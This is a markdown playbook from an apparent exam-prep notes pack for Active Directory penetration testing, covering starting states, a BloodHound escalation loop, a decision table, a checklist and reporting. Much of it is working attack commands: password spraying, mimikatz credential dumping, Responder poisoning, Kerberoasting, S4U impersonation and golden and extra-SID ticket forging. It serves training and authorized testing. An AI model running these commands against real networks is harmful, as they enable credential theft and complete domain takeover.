# AD - Methodology & Playbook

## Table of Contents
- [Assumed-Breach Starting Points](#assumed-breach-starting-points)
- [External-to-Internal Handoff](#external-to-internal-handoff)
- [The Standard Loop](#the-standard-loop)
- [Password Attacks in AD Context](#password-attacks-in-ad-context)
- [CRTP Workflow (Single Domain)](#crtp-workflow-single-domain)
- [CRTE / CPTS Workflow (Multi-Domain / Forest)](#crte--cpts-workflow-multi-domain--forest)
- [You Are Here -> Next Step (Master Decision Table)](#you-are-here---next-step-master-decision-table)
- [Domain-Compromise Checklist](#domain-compromise-checklist)
- [What to Record for the Report](#what-to-record-for-the-report)

This file is the spine that ties the pack together. Each edge here points at the file that details it: enumeration ([enumeration.md](enumeration.md)), Kerberos roasting/delegation ([kerberos.md](kerberos.md)), certificate abuse ([adcs.md](adcs.md)), ACL edges ([acl-abuse.md](acl-abuse.md)), coercion+relay ([ntlm-relay.md](ntlm-relay.md)), code exec/movement ([lateral-movement.md](lateral-movement.md)), dumping secrets ([credential-access.md](credential-access.md)), tickets/DCSync/persistence ([domain-dominance.md](domain-dominance.md)), cross-domain ([trusts.md](trusts.md)), cloud ([entra-hybrid.md](entra-hybrid.md)), tool install/syntax ([tooling.md](tooling.md)), and telemetry ([opsec-and-detection.md](opsec-and-detection.md)). Getting onto the network in the first place is covered in the `ctf-pivoting` pack (pivoting.md); host-level SYSTEM on a joined box is in the `ctf-privesc` pack (windows-privesc.md).

---

## Assumed-Breach Starting Points

Three realistic entry states. Identify which one you are in, then run its first moves.

### A. Low-priv domain user creds (username + password/hash), no shell
The most common exam start. You have LDAP/SMB/Kerberos reach but no code execution on any host.

```bash
# 1. Validate the cred and find where it is local admin
nxc smb <subnet>/24 -u user -p 'Password123'                 # sweep; "(Pwn3d!)" = local admin
nxc smb <subnet>/24 -u user -H <nthash>                      # pass-the-hash variant
nxc winrm <subnet>/24 -u user -p 'Password123'               # WinRM reach = evil-winrm shell

# 2. Full BloodHound collection from the cred (no shell needed)
nxc ldap <dc-ip> -u user -p 'Password123' --bloodhound --collection All --dns-server <dc-ip>
bloodhound-python -u user -p 'Password123' -d domain.local -ns <dc-ip> -c All --zip

# 3. Cheap wins that need only a valid cred
nxc ldap <dc-ip> -u user -p 'Password123' --asreproast asrep.txt --kerberoasting tgs.txt
nxc smb <dc-ip> -u user -p 'Password123' -M gpp_password -M spider_plus     # SYSVOL / share secrets
```
Then jump into [The Standard Loop](#the-standard-loop). If the cred is admin somewhere, get a shell (see [lateral-movement.md](lateral-movement.md)) and harvest. If not, roast/ACL your way to a better cred.

### B. Shell on a domain-joined host (no domain creds yet)
You landed via web/service exploit and are `nt authority\system`, a service account, or a local user.

```powershell
whoami /all                                  # SID, groups, privileges (SeImpersonate? -> potato)
klist                                         # any cached tickets to steal?
hostname; systeminfo | findstr /B "Domain"    # confirm domain membership
```
- **Not yet SYSTEM:** finish local privesc first — `windows-privesc.md` (ctf-privesc pack) (SeImpersonate -> PrintSpoofer/GodPotato, unquoted paths, service perms).
- **SYSTEM on a joined host:** you hold the *machine account*. Dump local secrets and pivot to domain context:
```powershell
# You are the computer account now — mint a TGT for it or dump LSA
.\Rubeus.exe tgtdeleg /nowrap          # usable TGT for the machine account
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::secrets" exit
```
```bash
# From Linux with the machine hash: machine account -> S4U2Self local admin (see kerberos.md)
impacket-getST -self -impersonate Administrator -spn 'host/host.domain.local' -hashes :<TARGET$ hash> domain.local/'TARGET$'
```
Cached creds, saved sessions of logged-in admins (`sekurlsa`), and DPAPI blobs are the loot here — see [credential-access.md](credential-access.md). Then run BloodHound as any recovered cred and enter the loop.

### C. Network access only, no creds (unauthenticated)
```bash
# 1. Find the DC and domain name
nxc smb <subnet>/24                                          # banner reveals domain + hostnames
nmap -p88,389,445,636,3268 -sV <subnet>/24
# 2. Unauth AD recon
nxc smb <dc-ip> -u '' -p ''                                  # null session
nxc smb <dc-ip> -u guest -p ''
enum4linux-ng -A <dc-ip>
impacket-lookupsid domain.local/anonymous@<dc-ip>            # RID cycle for usernames
ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts       # confirm base DN
# 3. Build a userlist, then AS-REP roast with no creds + spray
kerbrute userenum -d domain.local --dc <dc-ip> users.txt
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat
# 4. Poison the wire for creds while you work
sudo responder -I eth0 -wdv                                  # LLMNR/NBT-NS -> NetNTLMv2 -> crack/relay
```
Full unauth enumeration playbook lives in [enumeration.md](enumeration.md); Responder->relay chains in [ntlm-relay.md](ntlm-relay.md). Goal: obtain *any* valid cred, which drops you into state A.

---

## External-to-Internal Handoff

AD work begins the moment you have any of: a cred, a shell on a joined host, or route to the internal subnet. The order after an external web/service foothold:

1. **Establish route.** SOCKS proxy / port-forward through the foothold so Linux AD tooling can reach the DC. Chisel/ligolo/sshuttle patterns are in `pivoting.md` (ctf-pivoting pack). Run `nxc`/impacket through `proxychains`.
2. **Locate the domain.** From the foothold shell: `nltest /dsgetdc:` , `echo %USERDNSDOMAIN%`, `ipconfig /all` (DNS server = usually DC). From outside: reverse-DNS and SMB banners on the internal range.
3. **Determine your principal.** `whoami /all`. Are you a domain account (pivot to state A/B) or a pure local account (finish `windows-privesc.md` (ctf-privesc pack) to SYSTEM, then use the machine account)?
4. **Get creds off the box.** LSASS, SAM, DPAPI, config files, connection strings, `cmdkey /list`, IIS `web.config`, unattend.xml. See [credential-access.md](credential-access.md).
5. **Enumerate the domain** with the first cred (BloodHound) and enter the loop.

Rule of thumb: a local Administrator/SYSTEM on a domain-joined machine is *already* a domain foothold — the machine account is a domain principal. Do not treat "no domain user password" as a dead end.

---

## The Standard Loop

The engine of every AD compromise. Repeat until you own a Tier-0 asset.

```
enumerate (BloodHound)  ->  pick shortest path  ->  take ONE edge  ->  harvest new creds  ->  re-enumerate as new identity
```

1. **Enumerate.** Collect with the current identity and open BloodHound. Mark every owned principal as `Owned`, then run **Shortest Paths from Owned Principals to Domain Admins** (and to `Domain Controllers`, `Enterprise Admins`, and any high-value group). Full collection + cypher in [enumeration.md](enumeration.md).
2. **Pick the shortest / cheapest edge.** Prefer edges that need no cracking and no coercion first. Read the edge type -> jump to the file that details it:

| BloodHound edge | Take it via | File |
|---|---|---|
| `AdminTo` / `CanRDP` / `CanPSRemote` | log in, dump creds | [lateral-movement.md](lateral-movement.md) |
| `MemberOf` (to a useful group) | already have it | — |
| `GenericAll` / `GenericWrite` / `WriteDacl` / `WriteOwner` / `Owns` | targeted roast, shadow creds, pw reset, RBCD | [acl-abuse.md](acl-abuse.md) |
| `ForceChangePassword` | reset the target's password | [acl-abuse.md](acl-abuse.md) |
| `AddMember` | add self to the group | [acl-abuse.md](acl-abuse.md) |
| `AddKeyCredentialLink` | shadow credentials -> PKINIT | [adcs.md](adcs.md) |
| `HasSPN` / roastable | Kerberoast / AS-REP roast | [kerberos.md](kerberos.md) |
| `AllowedToDelegate` / `AllowedToAct` (RBCD) | S4U abuse | [kerberos.md](kerberos.md) |
| `DCSync` / `GetChanges`+`GetChangesAll` | secretsdump DCSync | [domain-dominance.md](domain-dominance.md) |
| `Enroll` on a vuln template (ESC1-8) | certipy | [adcs.md](adcs.md) |
| coercion needed | PetitPotam/printerbug -> relay | [ntlm-relay.md](ntlm-relay.md) |
| trust edge to another domain | SID history / cross-trust TGT | [trusts.md](trusts.md) |

3. **Take exactly one edge.** Convert it into a new credential or session (hash, ticket, cert, password, or shell).
4. **Harvest.** On any new host/context, immediately dump everything reachable: LSASS, SAM, LSA secrets, cached logons, DPAPI, browser creds, tickets, KeePass/config files. [credential-access.md](credential-access.md).
5. **Re-enumerate as the new identity.** Mark the new principal `Owned` in BloodHound and re-run shortest paths — new access usually reveals a shorter path. Repeat.

Stop conditions: you can DCSync `krbtgt`, you have code exec on a DC, or you hold Enterprise/Domain Admin. Then pivot to [domain-dominance.md](domain-dominance.md) for golden ticket / persistence and (multi-domain) [trusts.md](trusts.md).

---

## Password Attacks in AD Context

### Check lockout policy BEFORE spraying
Spraying blind can lock the whole domain and end your exam window. Always read the policy first.

```bash
nxc smb <dc-ip> -u user -p 'Pass' --pass-pol                 # LockoutThreshold, ObservationWindow
crackmapexec smb <dc-ip> -u user -p 'Pass' --pass-pol
```
```powershell
net accounts /domain
Get-DomainPolicy | Select -Expand SystemAccess                # PowerView; LockoutBadCount
```
Rule: keep attempts-per-account **below `LockoutThreshold`** within the `ObservationWindow`. If threshold is 5/30min, spray one password, wait, spray the next. If lockout is 0 (disabled), spray freely. Watch out for the fake "0" — a domain with a fine-grained password policy (PSO) can lock privileged accounts even when the default policy says none.

### Password spraying (one password, many users)
```bash
# Kerbrute — quiet, no bad-password increment on userenum, but passwordspray DOES increment badPwdCount
kerbrute passwordspray -d domain.local --dc <dc-ip> users.txt 'Winter2025!'
# netexec — --continue-on-success keeps going after the first hit; -k for Kerberos
nxc smb <dc-ip> -u users.txt -p 'Season2024!' --continue-on-success
nxc ldap <dc-ip> -u users.txt -p 'Season2024!' --continue-on-success
# impacket
for u in $(cat users.txt); do nxc smb <dc-ip> -u "$u" -p 'Company@123'; done
```
```powershell
# DomainPasswordSpray (from a joined host — auto-pulls the user list and respects lockout)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Spring2025!' -OutFile hits.txt
Invoke-DomainPasswordSpray -PasswordList passwords.txt -Domain domain.local -Force
```

### Common weak-password patterns to try first
`<Season><Year>!` (Winter2025!, Autumn2024!), `<Company>@123`, `<Company>2025`, `Welcome1`/`Welcome123`, `Password1`, `Password123!`, `<Month><Year>`, `Changeme123`, the company name + `!`, and `username == password` (`nxc ... --no-bruteforce -u users.txt -p users.txt`). Newly-created / reset accounts frequently sit at a default like `Changeme123!`.

### Credential stuffing / reuse across hosts
Any recovered password or hash should be replayed everywhere before you do anything harder:
```bash
nxc smb <subnet>/24 -u user -H <nthash> --continue-on-success        # PtH sweep, "(Pwn3d!)" = admin
nxc smb <subnet>/24 -u found_user -p 'FoundPass!' --local-auth       # local-account reuse across boxes
```
Local Administrator hash reuse (no LAPS) is a classic single-hash-owns-the-network path.

### AS-REP + Kerberoast crack loop
The self-feeding offline loop: roast -> crack -> the cracked service account is a new domain user -> spray/reuse it -> re-enumerate -> roast again with more visibility.
```bash
# 1. Grab both roast sets with any valid cred
nxc ldap <dc-ip> -u user -p 'Pass' --asreproast asrep.txt --kerberoasting tgs.txt
# 2. Crack (read the $krb5..$NN$ prefix for the mode — see kerberos.md)
hashcat -m 18200 asrep.txt rockyou.txt          # AS-REP
hashcat -m 13100 tgs.txt   rockyou.txt          # Kerberoast RC4
# 3. Every cracked password -> back into the spray/reuse step above -> re-enumerate
```
Full roasting mechanics, etype selection, and targeted variants: [kerberos.md](kerberos.md).

### When spraying fails -> relay
If lockout is tight or every password is strong, stop guessing and steal authentication instead. Poison LLMNR/NBT-NS/mDNS with Responder, capture NetNTLMv2, and either crack it or **relay** it to SMB/LDAP/AD CS. This bypasses passwords entirely. Full decision tree in [ntlm-relay.md](ntlm-relay.md).

---

## CRTP Workflow (Single Domain)

Canonical single-domain path. You start with a low-priv domain user on a joined host.

1. **Enumerate.** BloodHound + PowerView. Map SPNs, ACLs, delegation, local-admin groups, sessions. [enumeration.md](enumeration.md).
2. **Kerberoast / AS-REP roast.** Pull all roastable hashes, crack offline. [kerberos.md](kerberos.md).
3. **ACL abuse.** BloodHound almost always shows a `GenericWrite`/`GenericAll`/`WriteDacl`/`GenericAll on a group` edge — targeted kerberoast, add to a group, or reset a password. [acl-abuse.md](acl-abuse.md).
4. **Get local admin somewhere.** Use a cracked/reset cred where it is admin; get a shell. [lateral-movement.md](lateral-movement.md).
5. **Harvest creds.** `mimikatz sekurlsa::logonpasswords`, `lsadump::sam`, DPAPI, saved tickets — often a Domain Admin token or hash is cached on a server. [credential-access.md](credential-access.md).
6. **DA via DCSync.** With a DA hash (or a principal holding replication rights), DCSync `krbtgt` + `Administrator`. Then golden ticket for persistence. [domain-dominance.md](domain-dominance.md).

Also standard in CRTP labs: **unconstrained/constrained/RBCD delegation** ([kerberos.md](kerberos.md)) and **AD CS ESC1/ESC8** ([adcs.md](adcs.md)) as the escalation instead of, or alongside, roasting.

---

## CRTE / CPTS Workflow (Multi-Domain / Forest)

Once you own one domain, the forest is the target. Trust mechanics and exact syntax in [trusts.md](trusts.md).

1. **Own the current domain** via the CRTP loop above -> DCSync `krbtgt` of the child.
2. **Child -> parent (intra-forest).** SID history is not filtered inside a forest. Forge a golden/inter-realm ticket for the child that includes the parent's Enterprise Admins SID (`<forest-root-sid>-519`):
```powershell
# Requires child krbtgt hash + child SID + parent Enterprise Admins SID
mimikatz # kerberos::golden /user:Administrator /domain:child.domain.local /sid:<child-sid> /krbtgt:<child krbtgt hash> /sids:<root-sid>-519 /ptt
```
```bash
impacket-ticketer -nthash <child krbtgt> -domain-sid <child-sid> -domain child.domain.local -extra-sid <root-sid>-519 Administrator
# or one-shot cross-domain DCSync via the trust key
impacket-raiseChild domain.local/childadmin:'Pass'
```
3. **Cross-trust (inter-forest).** SID filtering usually blocks the -519 trick across a forest trust. Instead: enumerate what the trust exposes (foreign group memberships, `Allowed-to-Authenticate`), abuse the **inter-realm trust key** to forge a ticket to the trusting forest, hunt for accounts with rights on the other side, and look for **TGT delegation** on bidirectional trusts. [trusts.md](trusts.md).
4. **ADCS across a trust.** An enterprise CA is a forest-wide (sometimes cross-forest) Tier-0 asset. If the CA in domain A trusts principals from domain B, an ESC1/ESC8 there can mint a cert authenticating as a privileged user in the CA's domain regardless of which domain you started in. Enumerate CAs and templates across every reachable domain, not just yours. [adcs.md](adcs.md).
5. **Hybrid / cloud.** If Entra Connect / PHS / PTA is present, an on-prem DA can often pivot into the tenant (and vice-versa). [entra-hybrid.md](entra-hybrid.md).

CPTS additionally weights external enumeration, pivoting depth, and reporting — the same loop, more hosts and more manual chaining.

---

## You Are Here -> Next Step (Master Decision Table)

Keyed to what you currently hold. Find your row, do the "next move".

| You currently hold | Next move | File |
|---|---|---|
| Nothing but network access | Null/guest enum, RID cycle, Responder, unauth AS-REP roast | [enumeration.md](enumeration.md), [ntlm-relay.md](ntlm-relay.md) |
| A username list, no passwords | AS-REP roast (no-preauth), then careful spray after checking lockout | [kerberos.md](kerberos.md), [Password Attacks](#password-attacks-in-ad-context) |
| One low-priv domain cred | BloodHound + roast + `--pass-pol`; sweep for local admin | [enumeration.md](enumeration.md) |
| A cred that is local admin somewhere | Shell there, dump LSASS/SAM/DPAPI | [lateral-movement.md](lateral-movement.md), [credential-access.md](credential-access.md) |
| SYSTEM on a joined host (machine acct) | S4U2Self local admin, dump secrets, `tgtdeleg` | [kerberos.md](kerberos.md), [credential-access.md](credential-access.md) |
| A BloodHound write-edge on a user/computer/group | Targeted roast / shadow creds / RBCD / add-member | [acl-abuse.md](acl-abuse.md), [kerberos.md](kerberos.md) |
| A crackable roast hash | hashcat, then reuse/spray the plaintext | [kerberos.md](kerberos.md) |
| A NetNTLMv2 you can't crack | Relay to SMB/LDAP/HTTP(CA) | [ntlm-relay.md](ntlm-relay.md) |
| `Enroll` on a CA/vuln template | certipy ESC1-8 -> cert -> PKINIT/UnPAC hash | [adcs.md](adcs.md) |
| Coercible privileged host + relay target | PetitPotam/printerbug -> relay -> RBCD/cert | [ntlm-relay.md](ntlm-relay.md), [kerberos.md](kerberos.md) |
| Delegation configured (UD/CD/RBCD) | S4U / TGT capture -> impersonate DA | [kerberos.md](kerberos.md) |
| DA hash / replication rights | DCSync krbtgt + Administrator | [domain-dominance.md](domain-dominance.md) |
| krbtgt hash | Golden ticket; child->parent extra-SID | [domain-dominance.md](domain-dominance.md), [trusts.md](trusts.md) |
| Full domain owned, more domains exist | Child->parent, cross-trust, cross-trust ADCS | [trusts.md](trusts.md), [adcs.md](adcs.md) |
| On-prem DA + Entra Connect present | Hybrid pivot to cloud | [entra-hybrid.md](entra-hybrid.md) |
| Stuck — no visible path | Re-enumerate as EVERY owned principal; check sessions, GPO, shares, LAPS readers | [enumeration.md](enumeration.md) |

---

## Domain-Compromise Checklist

Work top to bottom; tick as you go.

- [ ] Identified starting state (A / B / C) and ran its first moves
- [ ] Route to the internal subnet established (proxy/forward if external)
- [ ] DC, domain FQDN, and forest root identified; `/etc/hosts` + `krb5.conf` set
- [ ] Clock synced to the DC (Kerberos ops fail on skew)
- [ ] At least one valid domain credential obtained
- [ ] Password/lockout policy read **before** any spray
- [ ] BloodHound collected (`-c All`), owned principals marked, shortest paths run
- [ ] AS-REP + Kerberoast sets pulled and cracking underway
- [ ] SYSVOL / shares spidered for GPP passwords, scripts, configs
- [ ] Credential reuse swept across all hosts (password + hash)
- [ ] ACL/delegation edges enumerated and the cheapest one taken
- [ ] AD CS enumerated (`certipy find`) for ESC1-8
- [ ] Coercion + relay considered if password attacks stalled
- [ ] Local admin obtained on at least one host; secrets harvested
- [ ] Tier-0 reached: DCSync / DC shell / DA membership
- [ ] `krbtgt` extracted; persistence established (only if in scope)
- [ ] Trusts enumerated; each reachable domain assessed
- [ ] Hybrid/cloud pivot checked if Entra Connect present
- [ ] Cleanup: removed added computers/SPNs/ACLs/group memberships (note each in report)

---

## What to Record for the Report

Capture as you go — reconstructing later wastes exam time. Log per stage:

- **Initial access:** how the first cred/shell was obtained (exploit, spray, roast), timestamp, source IP.
- **Every credential:** account, how obtained (roast/dump/reset/relay), cracked plaintext or hash, and where it was valid. Keep a running creds table.
- **Every host:** hostname, IP, OS, role (DC/member/CA), how access was gained, privilege level reached.
- **Every edge taken:** the BloodHound edge or misconfig, exact command, and the resulting new identity — this is your attack chain / path-to-DA narrative.
- **Proof screenshots:** `whoami /all` or `id` at each escalation, flag/loot files, `secretsdump` proving DCSync, `hostname` on the DC.
- **Every change you made:** created computers (`EVIL$`), added SPNs, ACL edits, group additions, uploaded binaries, forged tickets — needed for cleanup and for the remediation section.
- **Root cause per finding:** weak password, unconstrained delegation, vulnerable template, over-privileged ACL — maps to a concrete remediation.

The blue-team view (what each action generated in the logs) is in [opsec-and-detection.md](opsec-and-detection.md); mirror its "What to Record" section so your report's detection/remediation half writes itself.
